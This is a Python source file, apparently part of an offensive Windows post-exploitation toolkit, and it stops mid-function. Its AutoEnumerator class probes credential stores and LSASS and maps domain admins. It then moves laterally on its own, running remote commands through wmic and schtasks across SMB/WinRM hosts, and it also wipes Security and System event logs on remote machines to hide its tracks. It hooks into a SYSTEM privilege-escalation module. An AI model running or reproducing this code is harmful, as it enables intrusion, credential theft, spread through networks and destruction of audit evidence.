"""Auto-Enumeration Module - Comprehensive Automated Enumeration

Enhanced with all available tooling:
- PE5 SYSTEM escalation integration
- Relay client connectivity checks
- Enhanced privilege escalation enumeration
- Comprehensive module integration
"""

import json
import time
import re
import asyncio
from datetime import datetime
from typing import Dict, List, Any, Optional
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich import box
from modules.utils import execute_cmd, execute_powershell, validate_target
from modules.loghunter_integration import LogHunter, WindowsMoonwalk
from modules.pe5_utils import PE5Utils
from modules.pe5_system_escalation import PE5SystemEscalationModule


class AutoEnumerator:
    """Automated enumeration engine with automatic lateral movement"""
    
    def __init__(self, console: Console, session_data: dict):
        self.console = console
        self.session_data = session_data
        self.enumeration_data = {
            'timestamp': datetime.now().isoformat(),
            'foothold': {},
            'orientation': {},
            'identity': {},
            'network': {},
            'credentials': {},
            'lateral_targets': [],
            'persistence': {},
            'certificates': {},
            'lolbins_used': [],
            'lateral_paths': [],  # Track lateral movement paths
            'privilege_escalation': {},  # PE5 and other PE methods
            'relay_connectivity': {},  # Relay client checks
            'pe5_status': {},  # PE5 framework status
            'tooling_integration': {}  # All tooling usage
        }
        self.lab_use = session_data.get('LAB_USE', 0)
        self.max_depth = session_data.get('AUTO_ENUMERATE_DEPTH', 3)  # Maximum lateral movement depth (configurable)
        self.visited_hosts = set()  # Track visited hosts to avoid loops
        self.lateral_path = []  # Current lateral movement path
        self.loghunter = None
        self.moonwalk = WindowsMoonwalk(console, session_data)
        self.use_moonwalk = True  # Enable moonwalk at all stages
        self.pe5_module = None
        self.pe5_utils = PE5Utils()
        self.relay_client = None
    
    def run_full_enumeration(self) -> Dict[str, Any]:
        """Run complete enumeration across all modules"""
        self.console.print(Panel(
            "[bold]AUTO-ENUMERATION MODE[/bold]\n\n"
            "Running comprehensive enumeration across all modules...\n"
            f"Maximum lateral movement depth: {self.max_depth}",
            title="Auto-Enumeration",
            border_style="cyan"
        ))
        self.console.print()
        
        # Get initial hostname/IP to track
        try:
            exit_code, stdout, stderr = execute_cmd("hostname", lab_use=self.lab_use)
            if exit_code == 0:
                initial_host = stdout.strip()
                self.visited_hosts.add(initial_host)
                self.lateral_path.append(initial_host)
                self.enumeration_data['initial_host'] = initial_host
        except Exception:
            pass
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=self.console
        ) as progress:
            
            # Foothold enumeration
            task1 = progress.add_task("[cyan]Foothold Assessment...", total=100)
            self._enumerate_foothold(progress, task1)
            
            # Orientation enumeration
            task2 = progress.add_task("[cyan]Local Orientation...", total=100)
            self._enumerate_orientation(progress, task2)
            
            # Identity enumeration
            task3 = progress.add_task("[cyan]Identity Acquisition...", total=100)
            self._enumerate_identity(progress, task3)
            
            # Network enumeration
            task4 = progress.add_task("[cyan]Network Discovery...", total=100)
            self._enumerate_network(progress, task4)
            
            # Lateral movement targets
            task5 = progress.add_task("[cyan]Lateral Movement Targets...", total=100)
            lateral_targets = self._enumerate_lateral_targets(progress, task5)
            
            # Automatic lateral movement
            if lateral_targets:
                task5b = progress.add_task("[cyan]Automatic Lateral Movement...", total=100)
                self._perform_automatic_lateral_movement(progress, task5b, lateral_targets)
            
            # Persistence enumeration
            task6 = progress.add_task("[cyan]Persistence Mechanisms...", total=100)
            self._enumerate_persistence(progress, task6)
            
            # Certificate enumeration (if MADCert available)
            task7 = progress.add_task("[cyan]Certificate Enumeration...", total=100)
            self._enumerate_certificates(progress, task7)
            
            # PE5 Privilege Escalation enumeration
            task8 = progress.add_task("[cyan]PE5 Privilege Escalation...", total=100)
            self._enumerate_privilege_escalation(progress, task8)
            
            # Relay connectivity checks
            task8b = progress.add_task("[cyan]Relay Connectivity...", total=100)
            self._enumerate_relay_connectivity(progress, task8b)
            
            # LogHunter enumeration
            task9 = progress.add_task("[cyan]LogHunter Analysis...", total=100)
            self._enumerate_with_loghunter(progress, task9)
            
            # Comprehensive tooling integration
            task10 = progress.add_task("[cyan]Tooling Integration...", total=100)
            self._enumerate_tooling_integration(progress, task10)
            
            # Moonwalk cleanup
            if self.use_moonwalk:
                task11 = progress.add_task("[cyan]Moonwalk Cleanup...", total=100)
                self._perform_moonwalk_cleanup(progress, task11)
        
        return self.enumeration_data
    
    def _enumerate_foothold(self, progress, task):
        """Enumerate foothold information"""
        try:
            # Identity
            progress.update(task, advance=10, description="[cyan]Identity check...")
            exit_code, stdout, stderr = execute_cmd("whoami", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['foothold']['identity'] = stdout.strip()
            
            progress.update(task, advance=10, description="[cyan]Group memberships...")
            exit_code, stdout, stderr = execute_cmd("whoami /groups", lab_use=self.lab_use)
            if exit_code == 0:
                groups = [line.strip() for line in stdout.split('\n') if 'Group Name' in line or 'S-1-5' in line]
                self.enumeration_data['foothold']['groups'] = groups[:20]
            
            progress.update(task, advance=10, description="[cyan]Privileges...")
            exit_code, stdout, stderr = execute_cmd("whoami /priv", lab_use=self.lab_use)
            if exit_code == 0:
                privs = [line.strip() for line in stdout.split('\n') if 'Se' in line]
                self.enumeration_data['foothold']['privileges'] = privs[:20]
            
            # Check for SYSTEM privileges
            progress.update(task, advance=10, description="[cyan]SYSTEM privilege check...")
            ps_cmd = """
            $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $isSystem = ($token.User.Value -eq 'S-1-5-18')
            $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
            $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
            Write-Host "IsSystem: $isSystem"
            Write-Host "IsAdmin: $isAdmin"
            Write-Host "UserSID: $($token.User.Value)"
            """
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['foothold']['privilege_status'] = stdout
                if 'IsSystem: True' in stdout:
                    self.enumeration_data['foothold']['has_system'] = True
                else:
                    self.enumeration_data['foothold']['has_system'] = False
            
            # Host role
            progress.update(task, advance=20, description="[cyan]Host role classification...")
            exit_code, stdout, stderr = execute_cmd("netstat -ano | findstr LISTENING", lab_use=self.lab_use)
            if exit_code == 0:
                ports = {}
                for line in stdout.split('\n'):
                    if 'LISTENING' in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            addr = parts[1]
                            if ':' in addr:
                                port = addr.split(':')[-1]
                                ports[port] = ports.get(port, 0) + 1
                self.enumeration_data['foothold']['listening_ports'] = list(ports.keys())[:30]
                
                # Classify role
                if '389' in ports or '88' in ports:
                    self.enumeration_data['foothold']['role'] = 'Domain Controller'
                elif '445' in ports:
                    self.enumeration_data['foothold']['role'] = 'File Server'
                elif '80' in ports or '443' in ports:
                    self.enumeration_data['foothold']['role'] = 'Web Server'
                elif '5985' in ports or '5986' in ports:
                    self.enumeration_data['foothold']['role'] = 'Management Server'
                else:
                    self.enumeration_data['foothold']['role'] = 'Workstation/Other'
            
            # System info
            progress.update(task, advance=20, description="[cyan]System information...")
            exit_code, stdout, stderr = execute_cmd("systeminfo", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['foothold']['system_info'] = stdout[:1000]
            
            progress.update(task, advance=30, description="[green]Foothold enumeration complete")
        
        except Exception as e:
            self.enumeration_data['foothold']['error'] = str(e)
    
    def _enumerate_orientation(self, progress, task):
        """Enumerate local orientation"""
        try:
            # Local groups
            progress.update(task, advance=15, description="[cyan]Local groups...")
            exit_code, stdout, stderr = execute_cmd("net localgroup", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['local_groups'] = stdout
            
            # Local administrators
            progress.update(task, advance=10, description="[cyan]Local administrators...")
            exit_code, stdout, stderr = execute_cmd("net localgroup administrators", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['local_admins'] = stdout
            
            # Domain groups (if domain joined)
            progress.update(task, advance=15, description="[cyan]Domain groups...")
            exit_code, stdout, stderr = execute_cmd("net group /domain", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['domain_groups'] = stdout.split('\n')[:50]
            
            # Service accounts
            progress.update(task, advance=20, description="[cyan]Service accounts...")
            ps_cmd = "Get-WmiObject Win32_Service | Where-Object {$_.StartName -like '*@*'} | Select-Object -First 30 Name, StartName, State"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['service_accounts'] = stdout
            
            # Scheduled tasks
            progress.update(task, advance=20, description="[cyan]Scheduled tasks...")
            ps_cmd = "Get-ScheduledTask | Select-Object -First 30 TaskName, State, Actions"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['scheduled_tasks'] = stdout
            
            # Security software
            progress.update(task, advance=20, description="[cyan]Security software...")
            ps_cmd = "Get-Process | Where-Object {$_.ProcessName -match 'defender|security|av|firewall'} | Select-Object ProcessName, Id"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['security_software'] = stdout
            
            progress.update(task, advance=100, description="[green]Orientation enumeration complete")
        
        except Exception as e:
            self.enumeration_data['orientation']['error'] = str(e)
    
    def _enumerate_identity(self, progress, task):
        """Enumerate identity and credentials"""
        try:
            # Credential stores
            progress.update(task, advance=25, description="[cyan]Credential stores...")
            exit_code, stdout, stderr = execute_cmd("cmdkey /list", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['identity']['stored_credentials'] = stdout
            
            # Vault
            progress.update(task, advance=25, description="[cyan]Windows Vault...")
            exit_code, stdout, stderr = execute_cmd("vaultcmd /list", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['identity']['vault_credentials'] = stdout
            
            # Domain context
            progress.update(task, advance=25, description="[cyan]Domain context...")
            exit_code, stdout, stderr = execute_cmd("net group \"Domain Admins\" /domain", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['identity']['domain_admins'] = stdout
            
            # LSASS process
            progress.update(task, advance=25, description="[cyan]LSASS process...")
            ps_cmd = "Get-Process lsass -ErrorAction SilentlyContinue | Select-Object Id, ProcessName"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['identity']['lsass_process'] = stdout
            
            progress.update(task, advance=100, description="[green]Identity enumeration complete")
        
        except Exception as e:
            self.enumeration_data['identity']['error'] = str(e)
    
    def _enumerate_network(self, progress, task):
        """Enumerate network information"""
        try:
            # Network configuration
            progress.update(task, advance=20, description="[cyan]Network configuration...")
            exit_code, stdout, stderr = execute_cmd("ipconfig /all", lab_use=self.lab_use)
            if exit_code == 0:
                import re
                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                ips = re.findall(ip_pattern, stdout)
                is_local_ip = self.session_data.get('is_local_ip', lambda x: False)
                local_ips = [ip for ip in ips if is_local_ip(ip)]
                self.enumeration_data['network']['local_ips'] = list(set(local_ips))[:10]
                self.enumeration_data['network']['ipconfig'] = stdout[:500]
            
            # ARP cache
            progress.update(task, advance=20, description="[cyan]ARP cache...")
            exit_code, stdout, stderr = execute_cmd("arp -a", lab_use=self.lab_use)
            if exit_code == 0:
                import re
                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                arp_ips = re.findall(ip_pattern, stdout)
                is_local_ip = self.session_data.get('is_local_ip', lambda x: False)
                local_arp_ips = [ip for ip in arp_ips if is_local_ip(ip)]
                self.enumeration_data['network']['arp_targets'] = list(set(local_arp_ips))[:20]
            
            # Domain networks
            progress.update(task, advance=20, description="[cyan]Domain networks...")
            exit_code, stdout, stderr = execute_cmd("net view /domain", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['network']['domains'] = stdout
            
            # Domain controllers
            progress.update(task, advance=20, description="[cyan]Domain controllers...")
            exit_code, stdout, stderr = execute_cmd("nltest /dclist:", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['network']['domain_controllers'] = stdout
            
            # Network shares
            progress.update(task, advance=20, description="[cyan]Network shares...")
            exit_code, stdout, stderr = execute_cmd("net share", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['network']['local_shares'] = stdout
            
            progress.update(task, advance=100, description="[green]Network enumeration complete")
        
        except Exception as e:
            self.enumeration_data['network']['error'] = str(e)
    
    def _enumerate_lateral_targets(self, progress, task):
        """Enumerate potential lateral movement targets"""
        try:
            targets = []
            
            # Get network targets from ARP
            if 'arp_targets' in self.enumeration_data.get('network', {}):
                arp_targets = self.enumeration_data['network'].get('arp_targets', [])
                targets.extend(arp_targets[:10])
            
            # Test connectivity to targets
            progress.update(task, advance=30, description="[cyan]Testing target connectivity...")
            tested_targets = []
            for target in targets[:10]:  # Limit to 10 targets
                if not isinstance(target, str):
                    continue
                try:
                    # Test SMB
                    exit_code, stdout, stderr = execute_cmd(f"net view \\\\{target}", lab_use=self.lab_use)
                    if exit_code == 0:
                        self.enumeration_data['lateral_targets'].append({
                            'target': target,
                            'smb_accessible': True,
                            'shares': stdout[:200]
                        })
                    
                    # Test WinRM
                    ps_cmd = f"Test-WSMan -ComputerName {target} -ErrorAction SilentlyContinue"
                    exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
                    if exit_code == 0:
                        # Update existing target or create new
                        found = False
                        for t in self.enumeration_data['lateral_targets']:
                            if isinstance(t, dict) and t.get('target') == target:
                                t['winrm_accessible'] = True
                                found = True
                                break
                        if not found:
                            self.enumeration_data['lateral_targets'].append({
                                'target': target,
                                'winrm_accessible': True
                            })
                
                except Exception:
                    continue
                
                tested_targets.append(target)
            
            progress.update(task, advance=70, description="[green]Lateral targets enumeration complete")
            
            return self.enumeration_data['lateral_targets']
        
        except Exception as e:
            self.enumeration_data['lateral_targets'] = {'error': str(e)}
            return []
    
    def _perform_automatic_lateral_movement(self, progress, task, targets: List[Dict[str, Any]], depth: int = 0):
        """Automatically perform lateral movement using LOTL techniques"""
        if depth >= self.max_depth:
            progress.update(task, advance=100, description=f"[yellow]Maximum depth ({self.max_depth}) reached")
            return
        
        accessible_targets = []
        for target_info in targets:
            if not isinstance(target_info, dict):
                continue
            
            target = target_info.get('target')
            if not target or target in self.visited_hosts:
                continue
            
            # Check if target is accessible
            smb_accessible = target_info.get('smb_accessible', False)
            winrm_accessible = target_info.get('winrm_accessible', False)
            
            if smb_accessible or winrm_accessible:
                accessible_targets.append({
                    'target': target,
                    'smb': smb_accessible,
                    'winrm': winrm_accessible,
                    'depth': depth
                })
        
        if not accessible_targets:
            progress.update(task, advance=100, description="[yellow]No accessible targets found")
            return
        
        # Limit to first 3 accessible targets per depth
        accessible_targets = accessible_targets[:3]
        
        progress.update(task, advance=10, description=f"[cyan]Found {len(accessible_targets)} accessible target(s) at depth {depth}")
        
        for target_info in accessible_targets:
            target = target_info['target']
            self.visited_hosts.add(target)
            self.lateral_path.append(target)
            
            try:
                progress.update(task, advance=5, description=f"[cyan]Enumerating {target} (depth {depth})...")
                
                # Enumerate remote target
                remote_data = self._enumerate_remote_target(target, target_info, depth)
                
                # Moonwalk cleanup after remote enumeration
                if self.use_moonwalk:
                    try:
                        # Clear logs on remote target if possible
                        if target_info.get('winrm'):
                            ps_cmd = f'Invoke-Command -ComputerName {target} -ScriptBlock {{ wevtutil.exe cl Security; wevtutil.exe cl System }}'
                            execute_powershell(ps_cmd, lab_use=self.lab_use)
                        elif target_info.get('smb'):
                            # Use scheduled task to clear logs
                            task_name = f"CleanTask_{int(time.time())}"
                            cmd = 'wevtutil.exe cl Security & wevtutil.exe cl System'
                            create_cmd = f'schtasks /create /s {target} /tn {task_name} /tr "cmd.exe /c {cmd}" /sc once /st 00:00 /f'
                            execute_cmd(create_cmd, lab_use=self.lab_use)
                            run_cmd = f'schtasks /run /s {target} /tn {task_name}'
                            execute_cmd(run_cmd, lab_use=self.lab_use)
                            time.sleep(1)
                            delete_cmd = f'schtasks /delete /s {target} /tn {task_name} /f'
                            execute_cmd(delete_cmd, lab_use=self.lab_use)
                    except Exception:
                        pass  # Continue even if cleanup fails
                
                # Store lateral path
                path_entry = {
                    'path': self.lateral_path.copy(),
                    'depth': depth,
                    'target': target,
                    'method': 'wmic' if target_info.get('winrm') else 'smb',
                    'enumeration': remote_data
                }
                self.enumeration_data['lateral_paths'].append(path_entry)
                
                # Check for further lateral movement opportunities from this target
                if depth < self.max_depth - 1:
                    # Discover targets from remote machine
                    progress.update(task, advance=5, description=f"[cyan]Discovering targets from {target}...")
                    remote_targets = self._discover_remote_targets(target, target_info)
                    if remote_targets:
                        progress.update(task, advance=5, description=f"[cyan]Found {len(remote_targets)} targets from {target}, moving laterally...")
                        # Recursive lateral movement
                        self._perform_automatic_lateral_movement(progress, task, remote_targets, depth + 1)
                    else:
                        progress.update(task, advance=5, description=f"[dim]No new targets from {target}[/dim]")
                
                # Remove from path after enumeration
                if self.lateral_path and self.lateral_path[-1] == target:
                    self.lateral_path.pop()
            
            except Exception as e:
                self.console.print(f"[red]Error enumerating {target}: {e}[/red]")
                if self.lateral_path and self.lateral_path[-1] == target:
                    self.lateral_path.pop()
        
        progress.update(task, advance=100, description="[green]Lateral movement complete")
    
    def _enumerate_remote_target(self, target: str, target_info: Dict[str, Any], depth: int) -> Dict[str, Any]:
        """Enumerate a remote target using LOTL techniques"""
        remote_data = {
            'target': target,
            'depth': depth,
            'identity': {},
            'network': {},
            'system_info': {},
            'shares': []
        }
        
        try:
            # Choose method based on availability
            use_wmic = target_info.get('winrm', False)
            use_smb = target_info.get('smb', False)
            
            if use_wmic:
                # Use WMI for remote enumeration (LOTL)
                # System info
                wmic_cmd = f'wmic /node:{target} os get name,version'
                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    remote_data['system_info']['os'] = stdout[:200]
                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} os get')
                
                # Process list
                wmic_cmd = f'wmic /node:{target} process list brief'
                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    remote_data['system_info']['processes'] = stdout[:300]
                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} process list')
                
                # Network shares via WMI
                ps_cmd = f'Get-WmiObject -Class Win32_Share -ComputerName {target} | Select-Object Name, Path'
                exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    remote_data['network']['shares'] = stdout[:200]
                    self.enumeration_data['lolbins_used'].append(f'Get-WmiObject Win32_Share -ComputerName {target}')
                
                # Execute whoami remotely
                wmic_cmd = f'wmic /node:{target} process call create "whoami"'
                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    remote_data['identity']['whoami_executed'] = True
                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} process call create')
            
            elif use_smb:
                # Use SMB for remote enumeration (LOTL)
                # List shares
                smb_cmd = f'net view \\\\{target}'
                exit_code, stdout, stderr = execute_cmd(smb_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    remote_data['network']['shares'] = stdout[:200]
                    # Parse shares
                    shares = []
                    for line in stdout.split('\n'):
                        if 'Disk' in line or 'Print' in line:
                            parts = line.split()
                            if parts:
                                shares.append(parts[0])
                    remote_data['shares'] = shares[:10]
                    self.enumeration_data['lolbins_used'].append(f'net view \\\\{target}')
                
                # Execute command via scheduled task (LOTL)
                task_name = f"EnumTask_{int(time.time())}"
                cmd = 'whoami > C:\\Windows\\Temp\\enum_result.txt'
                
                # Create task
                create_cmd = f'schtasks /create /s {target} /tn {task_name} /tr "cmd.exe /c {cmd}" /sc once /st 00:00 /f'
                exit_code, stdout, stderr = execute_cmd(create_cmd, lab_use=self.lab_use)
                
                if exit_code == 0:
                    self.enumeration_data['lolbins_used'].append(f'schtasks /create /s {target}')
                    
                    # Run task
                    run_cmd = f'schtasks /run /s {target} /tn {task_name}'
                    execute_cmd(run_cmd, lab_use=self.lab_use)
                    self.enumeration_data['lolbins_used'].append(f'schtasks /run /s {target}')
                    
                    time.sleep(2)  # Wait for execution
                    
                    # Try to read result via SMB
                    read_cmd = f'type \\\\{target}\\C$\\Windows\\Temp\\enum_result.txt'
                    exit_code, stdout, stderr = execute_cmd(read_cmd, lab_use=self.lab_use)
                    if exit_code == 0:
                        remote_data['identity']['whoami'] = stdout.strip()
                    
                    # Clean up task
                    delete_cmd = f'schtasks /delete /s {target} /tn {task_name} /f'
                    execute_cmd(delete_cmd, lab_use=self.lab_use)
                    self.enumeration_data['lolbins_used'].append(f'schtasks /delete /s {target}')
                    
                    # Clean up temp file
                    del_cmd = f'del \\\\{target}\\C$\\Windows\\Temp\\enum_result.txt'
                    execute_cmd(del_cmd, lab_use=self.lab_use)
        
        except Exception as e:
            remote_data['error'] = str(e)
        
        return remote_data
    
    def _discover_remote_targets(self, target: str, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Discover targets from a remote machine using LOTL"""
        remote_targets = []
        
        try:
            use_wmic = target_info.get('winrm', False)
            use_smb = target_info.get('smb', False)
            
            if use_wmic:
                # Use WMI to execute net view on remote machine
                # Execute net view via WMI
                wmic_cmd = f'wmic /node:{target} process call create "net view /domain"'
                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} process call create "net view"')
                
                # Use PowerShell remoting to get network info
                ps_cmd = f'Invoke-Command -ComputerName {target} -ScriptBlock {{ Get-NetNeighbor | Select-Object -First 10 IPAddress }}'
                exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    # Parse IPs from output
                    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                    ips = re.findall(ip_pattern, stdout)
                    is_local_ip = self.session_data.get('is_local_ip', lambda x: False)
                    local_ips = [ip for ip in ips if is_local_ip(ip)]
                    
                    for ip in local_ips[:5]:
                        if ip not in self.visited_hosts and ip != target:
                            remote_targets.append({
                                'target': ip,
                                'smb_accessible': False,  # Will test
                                'winrm_accessible': False
                            })
            
            elif use_smb:
                # Use net view from remote machine via SMB
                # Execute net view via scheduled task
                task_name = f"NetViewTask_{int(time.time())}"
                cmd = 'net view /domain > C:\\Windows\\Temp\\netview_result.txt'
                
                create_cmd = f'schtasks /create /s {target} /tn {task_name} /tr "cmd.exe /c {cmd}" /sc once /st 00:00 /f'
                exit_code, stdout, stderr = execute_cmd(create_cmd, lab_use=self.lab_use)
                
                if exit_code == 0:
                    self.enumeration_data['lolbins_used'].append(f'schtasks /create /s {target} (net view)')
                    
                    # Run and wait
                    run_cmd = f'schtasks /run /s {target} /tn {task_name}'
                    execute_cmd(run_cmd, lab_use=self.lab_use)
                    time.sleep(2)
                    
                    # Read result via SMB
                    read_cmd = f'type \\\\{target}\\C$\\Windows\\Temp\\netview_result.txt'
                    exit_code, stdout, stderr = execute_cmd(read_cmd, lab_use=self.lab_use)
                    
                    if exit_code == 0:
                        # Parse computer names/IPs
                        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                        ips = re.findall(ip_pattern, stdout)
                        is_local_ip = self.session_data.get('is_local_ip', lambda x: False)
                        local_ips = [ip for ip in ips if is_local_ip(ip)]
                        
                        # Also look for computer names
                        hostname_pattern = r'\\\\[A-Za-z0-9\-]+'
                        hostnames = re.findall(hostname_pattern, stdout)
                        hostnames = [h.replace('\\\\', '') for h in hostnames]
                        
                        # Test connectivity to discovered targets
                        for ip in local_ips[:5]:
                            if ip not in self.visited_hosts and ip != target:
                                test_cmd = f'net view \\\\{ip}'
                                test_exit, _, _ = execute_cmd(test_cmd, lab_use=self.lab_use)
                                if test_exit == 0:
                                    remote_targets.append({
                                        'target': ip,
                                        'smb_accessible': True,
                                        'winrm_accessible': False
                                    })
                    
                    # Cleanup
                    delete_cmd = f'schtasks /delete /s {target} /tn {task_name} /f'
                    execute_cmd(delete_cmd, lab_use=self.lab_use)
                    del_cmd = f'del \\\\{target}\\C$\\Windows\\Temp\\netview_result.txt'
                    execute_cmd(del_cmd, lab_use=self.lab_use)
        
        except Exception as e:
            self.console.print(f"[dim]Error discovering targets from {target}: {e}[/dim]")
        
        return remote_targets
    
    def _enumerate_persistence(self, progress, task):
        """Enumerate persistence mechanisms"""
        try:
            # Scheduled tasks
            progress.update(task, advance=25, description="[cyan]Scheduled tasks...")
            ps_cmd = "Get-ScheduledTask | Get-ScheduledTaskInfo | Where-Object {$_.LastRunTime -gt (Get-Date).AddDays(-30)} | Select-Object TaskName, State, LastRunTime"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['persistence']['recent_tasks'] = stdout
            
            # Services
            progress.update(task, advance=25, description="[cyan]Services...")
            ps_cmd = "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 30 Name, DisplayName, Status"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['persistence']['services'] = stdout
            
            # WMI event subscriptions
            progress.update(task, advance=25, description="[cyan]WMI event subscriptions...")
            ps_cmd = "Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select-Object Name, Query"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['persistence']['wmi_subscriptions'] = stdout
            
            # Registry run keys
            progress.update(task, advance=25, description="[cyan]Registry run keys...")
            exit_code, stdout, stderr = execute_cmd("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['persistence']['registry_run_hkcu'] = stdout
            
            exit_code, stdout, stderr = execute_cmd("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['persistence']['registry_run_hklm'] = stdout
            
            progress.update(task, advance=100, description="[green]Persistence enumeration complete")
        
        except Exception as e:
            self.enumeration_data['persistence']['error'] = str(e)
    
    def _enumerate_certificates(self, progress, task):
        """Enumerate certificates (if MADCert available)"""
        try:
            from modules.madcert_integration import MADCertGenerator
            madcert_gen = MADCertGenerator(self.console, self.session_data)
            certs = madcert_gen.list_certificates()
            
            if certs:
                self.enumeration_data['certificates']['generated_certs'] = [
                    {
                        'name': c['name'],
                        'type': c['type'],
                        'ca': c.get('ca_name', 'N/A'),
                        'validity_days': c.get('validity_days', 0)
                    }
                    for c in certs
                ]
            
            progress.update(task, advance=100, description="[green]Certificate enumeration complete")
        
        except Exception:
            self.enumeration_data['certificates']['status'] = 'MADCert not available'
            progress.update(task, advance=100)
    
    def _enumerate_with_loghunter(self, progress, task):
        """Enumerate using LogHunter"""
        try:
            if not self.loghunter:
                self.loghunter = LogHunter(self.console, self.session_data)
                self.loghunter.loghunter_path = self.loghunter.find_loghunter()
            
            if not self.loghunter.loghunter_path:
                self.enumeration_data['loghunter'] = {'status': 'LogHunter not available'}
                progress.update(task, advance=100)
                return
            
            # Hunt credential access
            progress.update(task, advance=25, description="[cyan]Hunting credential access...")
            cred_results = self.loghunter.hunt_credential_access()
            self.enumeration_data['loghunter'] = {
                'credential_access': cred_results
            }
            
            # Hunt lateral movement
            progress.update(task, advance=25, description="[cyan]Hunting lateral movement...")
            lateral_results = self.loghunter.hunt_lateral_movement()
            self.enumeration_data['loghunter']['lateral_movement'] = lateral_results
            
            # Hunt privilege escalation
            progress.update(task, advance=25, description="[cyan]Hunting privilege escalation...")
            priv_results = self.loghunter.hunt_privilege_escalation()
            self.enumeration_data['loghunter']['privilege_escalation'] = priv_results
            
            progress.update(task, advance=25, description="[green]LogHunter analysis complete")
        
        except Exception as e:
            self.enumeration_data['loghunter'] = {'error': str(e)}
            progress.update(task, advance=100)
    
    def _enumerate_privilege_escalation(self, progress, task):
        """Enumerate privilege escalation opportunities using PE5 and other methods"""
        try:
            pe_data = {
                'current_privileges': {},
                'pe5_available': False,
                'pe5_framework_status': {},
                'windows_version': {},
                'pe_techniques': {},
                'escalation_attempted': False,
                'escalation_successful': False
            }
            
            # Check current privileges
            progress.update(task, advance=10, description="[cyan]Checking current privileges...")
            ps_cmd = """
            $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
            $isSystem = ($token.User.Value -eq 'S-1-5-18')
            $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
            $hasElevated = $token.Token.HasElevatedPrivileges
            
            @{
                IsSystem = $isSystem
                IsAdmin = $isAdmin
                HasElevatedPrivileges = $hasElevated
                UserSID = $token.User.Value
                UserName = $token.Name
            } | ConvertTo-Json
            """
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                try:
                    pe_data['current_privileges'] = json.loads(stdout)
                except:
                    pe_data['current_privileges'] = {'raw': stdout}
            
            # Check Windows version for PE5 compatibility
            progress.update(task, advance=15, description="[cyan]Detecting Windows version...")
            exit_code, stdout, stderr = execute_cmd("systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"", lab_use=self.lab_use)
            if exit_code == 0:
                pe_data['windows_version']['info'] = stdout
                # Extract version for PE5 offset detection
                if 'Windows 10' in stdout or 'Windows 11' in stdout:
                    pe_data['windows_version']['pe5_compatible'] = True
                    # Determine offsets
